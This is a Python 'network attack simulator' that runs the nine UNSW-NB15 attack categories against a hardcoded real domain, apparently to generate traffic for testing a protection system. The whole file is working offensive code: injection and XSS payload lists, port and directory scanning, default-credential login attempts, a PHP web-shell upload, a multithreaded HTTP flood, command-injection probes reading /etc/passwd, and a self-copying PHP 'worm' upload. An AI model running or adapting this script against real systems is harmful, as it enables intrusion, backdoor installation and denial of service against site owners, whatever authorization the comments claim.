#!/usr/bin/env python3
"""
Network Attack Simulator for UNSW-NB15 Dataset Categories
Educational and testing purposes only - for protection system development
Target: www.devergolabs.com (authorized testing)
"""

import requests
import socket
import threading
import time
import random
import string
import subprocess
import sys
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import json

class NetworkAttackSimulator:
    """
    Simulates 9 different network attack categories from UNSW-NB15 dataset
    For educational and authorized testing purposes only
    """
    
    def __init__(self, target_domain, timeout=10):
        self.target_domain = target_domain
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'NetworkSecurityTester/1.0'
        })
        
    def _log_attack(self, attack_type, details=""):
        """Log attack attempts for monitoring"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {attack_type}: {details}")
    
    def fuzzer_attack(self, num_requests=50):
        """
        1. Fuzzers: Send randomized malformed inputs to cause crashes
        """
        self._log_attack("FUZZER", f"Starting fuzzer attack with {num_requests} requests")
        
        # Common endpoints to fuzz
        endpoints = ['/api', '/admin', '/login', '/search', '/upload', '/contact']
        
        # Various malformed payloads
        fuzzing_payloads = [
            'A' * 10000,  # Buffer overflow attempt
            '../' * 100,   # Path traversal
            '<script>alert("xss")</script>',  # XSS
            "'; DROP TABLE users; --",  # SQL injection
            '\x00\x01\x02\x03\x04',  # Binary data
            '%' + ''.join(random.choices(string.ascii_letters + string.digits, k=100)),
            '{{7*7}}',  # Template injection
            '\n\r\n\r' + 'A' * 1000,  # HTTP header injection
        ]
        
        for i in range(num_requests):
            try:
                endpoint = random.choice(endpoints)
                payload = random.choice(fuzzing_payloads)
                url = f"http://{self.target_domain}{endpoint}"
                
                # Random HTTP method
                method = random.choice(['GET', 'POST', 'PUT', 'DELETE'])
                
                if method == 'GET':
                    response = self.session.get(url, params={'data': payload}, timeout=self.timeout)
                else:
                    response = self.session.post(url, data={'input': payload}, timeout=self.timeout)
                
                self._log_attack("FUZZER", f"Request {i+1}: {method} {url} -> {response.status_code}")
                
            except Exception as e:
                self._log_attack("FUZZER", f"Request {i+1} failed: {str(e)}")
            
            time.sleep(0.1)  # Small delay between requests
    
    def analysis_attack(self):
        """
        2. Analysis: Network/host analysis, fingerprinting, traffic reconnaissance
        """
        self._log_attack("ANALYSIS", "Starting network analysis and fingerprinting")
        
        try:
            # HTTP fingerprinting
            response = self.session.get(f"http://{self.target_domain}", timeout=self.timeout)
            headers = dict(response.headers)
            
            self._log_attack("ANALYSIS", f"Server headers: {json.dumps(headers, indent=2)}")
            
            # Try to identify server technology
            tech_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Generator']
            for header in tech_headers:
                if header in headers:
                    self._log_attack("ANALYSIS", f"Technology detected: {header}: {headers[header]}")
            
            # Port scanning simulation (common web ports)
            common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017, 3000, 5000, 8000, 9000, 10000]
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((self.target_domain, port))
                    if result == 0:
                        self._log_attack("ANALYSIS", f"Port {port} is open")
                    sock.close()
                except Exception as e:
                    pass
            
            # HTTP methods enumeration
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE', 'PATCH']
            for method in methods:
                try:
                    response = self.session.request(method, f"http://{self.target_domain}", timeout=self.timeout)
                    self._log_attack("ANALYSIS", f"Method {method}: {response.status_code}")
                except Exception as e:
                    pass
                    
        except Exception as e:
            self._log_attack("ANALYSIS", f"Analysis failed: {str(e)}")
    
    def backdoor_attack(self):
        """
        3. Backdoors: Attempt to install or utilize backdoor accounts
        """
        self._log_attack("BACKDOOR", "Attempting backdoor installation/access")
        
        # Common backdoor file names and paths
        backdoor_paths = [
            '/shell.php',
            '/cmd.php', 
            '/backdoor.asp',
            '/admin/shell.jsp',
            '/uploads/shell.php',
            '/.htaccess',
            '/config.php.bak'
        ]
        
        # Attempt to access potential backdoors
        for path in backdoor_paths:
            try:
                url = f"http://{self.target_domain}{path}"
                response = self.session.get(url, timeout=self.timeout)
                self._log_attack("BACKDOOR", f"Checking {path}: {response.status_code}")
                
                if response.status_code == 200 and len(response.text) > 0:
                    self._log_attack("BACKDOOR", f"Potential backdoor found: {path}")
                    
            except Exception as e:
                pass
        
        # Attempt to create backdoor via file upload (if upload endpoint exists)
        backdoor_content = "<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>"
        files = {'file': ('shell.php', backdoor_content, 'application/x-php')}
        
        upload_endpoints = ['/upload', '/admin/upload', '/api/upload', '/files/upload']
        for endpoint in upload_endpoints:
            try:
                url = f"http://{self.target_domain}{endpoint}"
                response = self.session.post(url, files=files, timeout=self.timeout)
                self._log_attack("BACKDOOR", f"Upload attempt to {endpoint}: {response.status_code}")
            except Exception as e:
                pass
    
    def dos_attack(self, duration=30, threads=10):
        """
        4. DoS: Denial of Service attack to exhaust resources
        """
        self._log_attack("DOS", f"Starting DoS attack for {duration} seconds with {threads} threads")
        
        def dos_worker():
            end_time = time.time() + duration
            request_count = 0
            
            while time.time() < end_time:
                try:
                    # Send rapid requests to exhaust resources
                    response = self.session.get(
                        f"http://{self.target_domain}",
                        timeout=1,
                        headers={'Connection': 'keep-alive'}
                    )
                    request_count += 1
                    
                    if request_count % 100 == 0:
                        self._log_attack("DOS", f"Thread sent {request_count} requests")
                        
                except Exception as e:
                    pass
        
        # Launch multiple threads for concurrent requests
        threads_list = []
        for i in range(threads):
            thread = threading.Thread(target=dos_worker)
            thread.start()
            threads_list.append(thread)
        
        # Wait for all threads to complete
        for thread in threads_list:
            thread.join()
        
        self._log_attack("DOS", "DoS attack completed")
    
    def exploit_attack(self):
        """
        5. Exploits: Attempt to exploit known vulnerabilities
        """
        self._log_attack("EXPLOIT", "Testing for common web vulnerabilities")
        
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT username, password FROM users --",
            "admin'--",
            "' OR 1=1 --"
        ]
        
        # XSS payloads  
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        endpoints = ['/login', '/search', '/api/user', '/admin', '/file']
        
        for endpoint in endpoints:
            url = f"http://{self.target_domain}{endpoint}"
            
            # Test SQL injection
            for payload in sql_payloads:
                try:
                    response = self.session.post(url, data={'username': payload, 'password': 'test'}, timeout=self.timeout)
                    self._log_attack("EXPLOIT", f"SQL test on {endpoint}: {response.status_code}")
                except Exception as e:
                    pass
            
            # Test XSS
            for payload in xss_payloads:
                try:
                    response = self.session.get(url, params={'q': payload}, timeout=self.timeout)
                    if payload in response.text:
                        self._log_attack("EXPLOIT", f"Potential XSS in {endpoint}")
                except Exception as e:
                    pass
            
            # Test path traversal
            for payload in path_payloads:
                try:
                    response = self.session.get(url, params={'file': payload}, timeout=self.timeout)
                    if 'root:' in response.text or 'localhost' in response.text:
                        self._log_attack("EXPLOIT", f"Potential path traversal in {endpoint}")
                except Exception as e:
                    pass
    
    def generic_attack(self):
        """
        6. Generic: Common widespread attack patterns
        """
        self._log_attack("GENERIC", "Executing generic attack patterns")
        
        # Common attack vectors
        generic_tests = [
            # Admin panel discovery
            ('/admin', 'GET', {}),
            ('/administrator', 'GET', {}),
            ('/wp-admin', 'GET', {}),
            ('/phpmyadmin', 'GET', {}),
            
            # Common file discovery
            ('/robots.txt', 'GET', {}),
            ('/.htaccess', 'GET', {}),
            ('/config.php', 'GET', {}),
            ('/database.sql', 'GET', {}),
            
            # Login brute force attempts
            ('/login', 'POST', {'username': 'admin', 'password': 'admin'}),
            ('/login', 'POST', {'username': 'admin', 'password': '123456'}),
            ('/login', 'POST', {'username': 'root', 'password': 'password'}),
            
            # API endpoint discovery
            ('/api/v1/users', 'GET', {}),
            ('/api/config', 'GET', {}),
            ('/api/admin', 'GET', {}),
        ]
        
        for path, method, data in generic_tests:
            try:
                url = f"http://{self.target_domain}{path}"
                if method == 'GET':
                    response = self.session.get(url, timeout=self.timeout)
                else:
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                self._log_attack("GENERIC", f"{method} {path}: {response.status_code}")
                
                # Check for interesting responses
                if response.status_code not in [404, 403]:
                    self._log_attack("GENERIC", f"Interesting response from {path}: {response.status_code}")
                    
            except Exception as e:
                pass
    
    def reconnaissance_attack(self):
        """
        7. Reconnaissance: Scanning and information gathering
        """
        self._log_attack("RECONNAISSANCE", "Starting reconnaissance scan")
        
        try:
            # DNS information gathering
            import socket
            ip = socket.gethostbyname(self.target_domain)
            self._log_attack("RECONNAISSANCE", f"Target IP: {ip}")
            
            # HTTP reconnaissance
            response = self.session.get(f"http://{self.target_domain}", timeout=self.timeout)
            
            # Extract information from HTML
            if response.text:
                # Look for comments
                if '<!--' in response.text:
                    self._log_attack("RECONNAISSANCE", "HTML comments found (potential info disclosure)")
                
                # Look for forms
                if '<form' in response.text.lower():
                    self._log_attack("RECONNAISSANCE", "Forms detected")
                
                # Look for JavaScript files
                if '.js' in response.text:
                    self._log_attack("RECONNAISSANCE", "JavaScript files detected")
            
            # Directory enumeration
            common_dirs = [
                '/admin', '/api', '/backup', '/config', '/database', 
                '/files', '/images', '/uploads', '/css', '/js',
                '/test', '/dev', '/staging', '/old', '/new'
            ]
            
            for directory in common_dirs:
                try:
                    url = f"http://{self.target_domain}{directory}"
                    response = self.session.head(url, timeout=self.timeout)
                    if response.status_code not in [404, 403]:
                        self._log_attack("RECONNAISSANCE", f"Directory found: {directory} ({response.status_code})")
                except Exception as e:
                    pass
            
            # Subdomain enumeration (basic)
            subdomains = ['www', 'api', 'admin', 'mail', 'ftp', 'test', 'dev', 'staging']
            for sub in subdomains:
                try:
                    subdomain = f"{sub}.{self.target_domain}"
                    ip = socket.gethostbyname(subdomain)
                    self._log_attack("RECONNAISSANCE", f"Subdomain found: {subdomain} -> {ip}")
                except Exception as e:
                    pass
                    
        except Exception as e:
            self._log_attack("RECONNAISSANCE", f"Reconnaissance failed: {str(e)}")
    
    def shellcode_attack(self):
        """
        8. Shellcode: Injection of code for remote shell access
        """
        self._log_attack("SHELLCODE", "Attempting shellcode injection")
        
        # Common shellcode injection points
        injection_payloads = [
            # PHP code injection
            "<?php system($_GET['cmd']); ?>",
            "<?php eval($_POST['code']); ?>",
            
            # Command injection
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            
            # Server-side template injection
            "${7*7}",
            "{{config.items()}}",
            "${@print(system('whoami'))}",
            
            # LDAP injection
            "*)(uid=*))(|(uid=*",
            
            # NoSQL injection
            "'; return this.a == 'b' || true; var f='",
        ]
        
        endpoints = ['/eval', '/exec', '/cmd', '/api/run', '/admin/execute', '/shell']
        parameters = ['cmd', 'code', 'exec', 'eval', 'system', 'run']
        
        for endpoint in endpoints:
            url = f"http://{self.target_domain}{endpoint}"
            
            for payload in injection_payloads:
                for param in parameters:
                    try:
                        # GET request
                        response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                        self._log_attack("SHELLCODE", f"GET {endpoint}?{param}=payload: {response.status_code}")
                        
                        # POST request
                        response = self.session.post(url, data={param: payload}, timeout=self.timeout)
                        self._log_attack("SHELLCODE", f"POST {endpoint} {param}=payload: {response.status_code}")
                        
                        # Check for command execution indicators
                        indicators = ['uid=', 'gid=', 'root:', 'www-data', 'apache', 'nginx']
                        for indicator in indicators:
                            if indicator in response.text:
                                self._log_attack("SHELLCODE", f"Potential code execution detected in {endpoint}")
                                
                    except Exception as e:
                        pass
                        
                    time.sleep(0.1)  # Small delay
    
    def worm_attack(self, propagation_attempts=10):
        """
        9. Worms: Self-replicating malware simulation
        """
        self._log_attack("WORM", f"Simulating worm propagation with {propagation_attempts} attempts")
        
        # Simulate worm behavior - scanning for vulnerable services
        # In a real worm, this would spread to other hosts
        
        # Common ports that worms target
        worm_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 445, 993, 995, 1433, 3389]
        
        for attempt in range(propagation_attempts):
            # Simulate scanning behavior
            port = random.choice(worm_ports)
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_domain, port))
                
                if result == 0:
                    self._log_attack("WORM", f"Propagation attempt {attempt+1}: Port {port} accessible")
                    
                    # Simulate exploit attempt on open port
                    if port == 80:  # HTTP
                        try:
                            # Attempt to upload worm payload
                            worm_payload = "<?php file_put_contents('worm.php', file_get_contents(__FILE__)); ?>"
                            response = self.session.post(
                                f"http://{self.target_domain}/upload",
                                files={'file': ('worm.php', worm_payload, 'application/x-php')},
                                timeout=self.timeout
                            )
                            self._log_attack("WORM", f"Worm upload attempt: {response.status_code}")
                        except Exception as e:
                            pass
                    
                    elif port == 21:  # FTP
                        self._log_attack("WORM", f"Simulating FTP worm propagation attempt")
                    
                    elif port == 22:  # SSH
                        self._log_attack("WORM", f"Simulating SSH worm propagation attempt")
                
                sock.close()
                
            except Exception as e:
                pass
            
            time.sleep(0.5)  # Delay between propagation attempts
        
        # Simulate worm self-replication attempt
        replication_endpoints = ['/admin/backup', '/files/copy', '/api/replicate']
        for endpoint in replication_endpoints:
            try:
                url = f"http://{self.target_domain}{endpoint}"
                response = self.session.post(
                    url,
                    data={'source': __file__, 'target': 'worm_copy.py'},
                    timeout=self.timeout
                )
                self._log_attack("WORM", f"Self-replication attempt {endpoint}: {response.status_code}")
            except Exception as e:
                pass
    
    def run_all_attacks(self):
        """Execute all attack categories"""
        print("="*60)
        print("NETWORK ATTACK SIMULATOR - UNSW-NB15 Categories")
        print(f"Target: {self.target_domain}")
        print("="*60)
        
        attacks = [
            ("Fuzzers", self.fuzzer_attack),
            ("Analysis", self.analysis_attack),
            ("Backdoors", self.backdoor_attack),
            ("DoS", lambda: self.dos_attack(duration=10, threads=5)),  # Shorter for testing
            ("Exploits", self.exploit_attack),
            ("Generic", self.generic_attack),
            ("Reconnaissance", self.reconnaissance_attack),
            ("Shellcode", self.shellcode_attack),
            ("Worms", self.worm_attack)
        ]
        
        for attack_name, attack_method in attacks:
            print(f"\n--- Executing {attack_name} Attack ---")
            try:
                attack_method()
            except Exception as e:
                self._log_attack("ERROR", f"{attack_name} attack failed: {str(e)}")
            print(f"--- {attack_name} Attack Completed ---\n")


if __name__ == "__main__":
    # Hardcoded variables for testing
    TARGET_WEBSITE = "www.devergolabs.com"
    ATTACK_TYPE = "dos"  # Options: "all", "fuzzer", "analysis", "backdoor", "dos", "exploit", "generic", "reconnaissance", "shellcode", "worm"
    
    print("Network Attack Simulator for Protection System Testing")
    print("=" * 60)
    print(f"Target Website: {TARGET_WEBSITE}")
    print(f"Attack Type: {ATTACK_TYPE}")
    print("=" * 60)
    print("WARNING: This tool is for authorized testing only!")
    print("Only use against websites you own or have explicit permission to test.")
    print("=" * 60)
    
    # Initialize the attack simulator
    simulator = NetworkAttackSimulator(TARGET_WEBSITE, timeout=5)
    
    # Execute attacks based on ATTACK_TYPE
    if ATTACK_TYPE.lower() == "all":
        simulator.run_all_attacks()
    elif ATTACK_TYPE.lower() == "fuzzer":
        simulator.fuzzer_attack()
    elif ATTACK_TYPE.lower() == "analysis": #yes
        simulator.analysis_attack()
    elif ATTACK_TYPE.lower() == "backdoor":
        simulator.backdoor_attack()
    elif ATTACK_TYPE.lower() == "dos":
        simulator.dos_attack(duration=0.2, threads=300)
    elif ATTACK_TYPE.lower() == "exploit":
        simulator.exploit_attack()
    elif ATTACK_TYPE.lower() == "generic":
        simulator.generic_attack()
    elif ATTACK_TYPE.lower() == "reconnaissance":
        simulator.reconnaissance_attack()
    elif ATTACK_TYPE.lower() == "shellcode":
        simulator.shellcode_attack()
    elif ATTACK_TYPE.lower() == "worm":
        simulator.worm_attack()
    else:
        print(f"Unknown attack type: {ATTACK_TYPE}")
        print("Available types: all, fuzzer, analysis, backdoor, dos, exploit, generic, reconnaissance, shellcode, worm")
    
    print("\n" + "=" * 60)
    print("Attack simulation completed!")
    print("Review the logs above to analyze the attack patterns and responses.")
    print("=" * 60)
